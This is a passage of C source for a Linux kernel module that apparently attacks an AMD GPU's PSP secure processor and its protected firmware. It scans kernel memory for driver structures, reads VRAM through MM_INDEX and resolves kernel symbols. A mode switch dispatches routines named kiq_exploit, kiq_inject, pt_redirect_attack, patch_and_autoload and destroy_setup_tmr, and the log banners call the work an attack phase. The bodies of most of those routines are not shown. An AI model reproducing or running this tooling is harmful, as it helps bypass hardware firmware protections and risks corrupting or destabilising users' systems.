	 *    Pattern: mec_fw_obj (kptr), mec_fw_mc_addr (VRAM addr), then
	 *    possibly mec_fw_gpu_addr nearby. Look for triplets. */
	pr_info("fw36: === SEARCH FOR MEC STRUCT (obj/mc/gpu triplet) ===\n");
	for (off = 16; off < 0x80000; off += 8) {
		u64 v0 = *(u64 *)((u8 *)adev + off);      /* could be mec_fw_obj (kptr) */
		u64 v1 = *(u64 *)((u8 *)adev + off + 8);  /* could be mc_addr */
		u64 v2 = *(u64 *)((u8 *)adev + off + 16); /* could be gpu_addr */
		/* Pattern: kptr, then VRAM-range addr, then another addr */
		if ((v0 >> 48) == 0xFFFF && v0 != 0xFFFFFFFFFFFFFFFFULL &&
		    v1 >= 0x8000000000ULL && v1 <= 0x97FF000000ULL &&
		    (v1 & 0xFFF) == 0) {
			pr_info("fw36: Triplet at adev+0x%X: obj=0x%llX mc=0x%llX v2=0x%llX\n",
				off, v0, v1, v2);
			/* Try to read BO kptr */
			{
				u64 kptr;
				int koff;
				for (koff = 0x48; koff <= 0xB8; koff += 8) {
					if (copy_from_kernel_nofault(&kptr,
						(void *)((unsigned long)v0 + koff), 8) == 0 &&
					    (kptr >> 48) == 0xFFFF && kptr != v0) {
						u32 test[4];
						if (copy_from_kernel_nofault(test,
							(void *)(unsigned long)kptr, 16) == 0 &&
						    (test[0] != 0 || test[1] != 0)) {
							pr_info("fw36:   BO+0x%X kptr=0x%llX: "
								"%08X %08X %08X %08X\n",
								koff, kptr,
								test[0], test[1], test[2], test[3]);
						}
					}
				}
			}
		}
	}

	/* 3) Try MM_INDEX indirect VRAM access at IC_BASE and various offsets.
	 *    IC_BASE might be:
	 *    a) Raw MC physical → read at IC_BASE directly
	 *    b) VRAM offset → read at IC_BASE (if FB starts at 0)
	 *    c) MC addr → VRAM offset = IC_BASE - fb_base */
	pr_info("fw36: === MM_INDEX VRAM PROBE ===\n");
	{
		u64 addrs[] = {
			ic_base,                          /* IC_BASE as raw address */
			ic_base - fb_base,                /* IC_BASE - FB_BASE (may wrap) */
			fb_base,                          /* FB_BASE itself (should see VRAM start) */
			0x97E0000000ULL,                  /* TMR base */
		};
		const char *names[] = {
			"IC_BASE raw", "IC_BASE-FB_BASE", "FB_BASE", "TMR_BASE"
		};
		int i;
		for (i = 0; i < 4; i++) {
			u64 addr = addrs[i];
			u32 d0, d1, d2, d3;
			if (addr > 0x100000000000ULL) {
				pr_info("fw36: %s: 0x%llX (too high, skip)\n", names[i], addr);
				continue;
			}
			d0 = vram_read32(addr);
			d1 = vram_read32(addr + 4);
			d2 = vram_read32(addr + 8);
			d3 = vram_read32(addr + 12);
			pr_info("fw36: %s [0x%llX]: %08X %08X %08X %08X\n",
				names[i], addr, d0, d1, d2, d3);
		}
	}

	/* 4) Read firmware via MM_INDEX at IC_BASE (if it's a reasonable offset).
	 *    If IC_BASE < VRAM size (~16GB), it could be raw VRAM offset. */
	if (ic_base < 0x400000000ULL) { /* < 16GB */
		u32 fw[16];
		int i;
		pr_info("fw36: Reading 64 bytes at VRAM offset 0x%llX via MM_INDEX...\n",
			ic_base);
		for (i = 0; i < 16; i++)
			fw[i] = vram_read32(ic_base + i * 4);
		pr_info("fw36: FW header:\n");
		for (i = 0; i < 16; i += 4)
			pr_info("fw36:   [%02d] %08X %08X %08X %08X\n",
				i, fw[i], fw[i+1], fw[i+2], fw[i+3]);

		/* Check if it looks like valid code (non-zero) */
		if (fw[0] != 0 || fw[1] != 0 || fw[2] != 0 || fw[3] != 0)
			pr_info("fw36: *** DATA FOUND AT IC_BASE VRAM OFFSET! ***\n");
		else
			pr_info("fw36: Reads as all-zero (wrong address or encrypted)\n");
	}
}

static int __init fw36_init(void)
{
	unsigned long addr;
	void *drm_dev, *adev, *psp;

	g_pdev = pci_get_device(AMD_VENDOR_ID, AMD_DEV_ID, NULL);
	if (!g_pdev) return -ENODEV;

	mmio = pci_iomap(g_pdev, 5, 0);
	if (!mmio) { pci_dev_put(g_pdev); return -ENODEV; }

	pr_info("fw36: ====================================================\n");
	pr_info("fw36: PHASE 35: DIRECT RING SUBMIT WITH INTERNAL BUFFERS\n");
	pr_info("fw36: Mode: %d\n", attack_mode);
	pr_info("fw36: ====================================================\n");

	pr_info("fw36: MEC: PC=0x%04X CNTL=0x%08X\n",
		rr(regCP_MEC1_INSTR_PNTR), rr(regCP_MEC_CNTL));

	/* Resolve functions */
	addr = klookup("psp_ring_cmd_submit");
	psp_ring_submit = addr ? (fn_psp_ring_cmd_submit)addr : NULL;
	pr_info("fw36: psp_ring_cmd_submit = 0x%lX\n", addr);

	addr = klookup("psp_cmd_submit_buf");
	psp_cmd_submit = addr ? (fn_psp_cmd_submit)addr : NULL;
	pr_info("fw36: psp_cmd_submit_buf = 0x%lX\n", addr);

	addr = klookup("amdgpu_device_rreg");
	adev_rreg = addr ? (fn_adev_rreg)addr : NULL;
	pr_info("fw36: amdgpu_device_rreg = 0x%lX\n", addr);

	addr = klookup("amdgpu_device_wreg");
	adev_wreg = addr ? (fn_adev_wreg)addr : NULL;
	pr_info("fw36: amdgpu_device_wreg = 0x%lX\n", addr);

	/* Find adev */
	drm_dev = pci_get_drvdata(g_pdev);
	if (!drm_dev) { pr_info("fw36: No drm_dev\n"); goto fail; }

	adev = find_adev(drm_dev);
	if (!adev) { pr_info("fw36: No adev\n"); goto fail; }

	psp = (void *)((u8 *)adev + PSP_OFFSET_IN_ADEV);
	pr_info("fw36: psp_context = %p\n", psp);

	switch (attack_mode) {
	case 0: dump_psp_state(psp); break;
	case 1: dump_psp_state(psp); test_ring_state(psp); break;
	case 2: test_ring_state(psp); cmd_id_sweep(psp); break;
	case 3: test_ring_state(psp); try_boot_cfg(psp); break;
	case 4: tmr_query(psp); break;
	case 5: test_ring_state(psp); try_load_ip_fw(psp, adev); break;
	case 6: patch_and_autoload(psp, adev); break;
	case 7: destroy_setup_tmr(psp, adev); break;
	case 8: mec_sram_rw(psp, adev); break;
	case 9: gpuvm_probe(psp, adev); break;
	case 10: vram_fw_access(psp, adev); break;
	case 11: vram_fw_scan(psp, adev); break;
	case 12: pt_redirect_attack(psp, adev); break;
	case 13: pt_redirect_execute(psp, adev); break;
	case 14: iommu_fw_access(psp, adev); break;
	case 15: tmr_fw_hunt(psp, adev); break;
	case 16: mec_ucode_read(psp, adev); break;
	case 17: mdbase_probe(psp, adev); break;
	case 18: kiq_exploit(psp, adev); break;
	case 19: kiq_inject(psp, adev); break;
	case 20: kiq_ring_submit(psp, adev); break;
	default: dump_psp_state(psp); break;
	}

	pr_info("fw36: ====================================================\n");
	pr_info("fw36: Phase 35 complete.\n");
	pr_info("fw36: ====================================================\n");
	return 0;

fail:
	pci_iounmap(g_pdev, mmio);
	pci_dev_put(g_pdev);
	return -ENODEV;
}

static void __exit fw36_exit(void)
{
	if (fw_dma_buf && fw_dma_size) {
		dma_free_coherent(&g_pdev->dev, fw_dma_size, fw_dma_buf, fw_dma_addr);
		fw_dma_buf = NULL;
	}
	pci_iounmap(g_pdev, mmio);
	pci_dev_put(g_pdev);
	pr_info("fw36: unloaded\n");
}

module_init(fw36_init);
module_exit(fw36_exit);
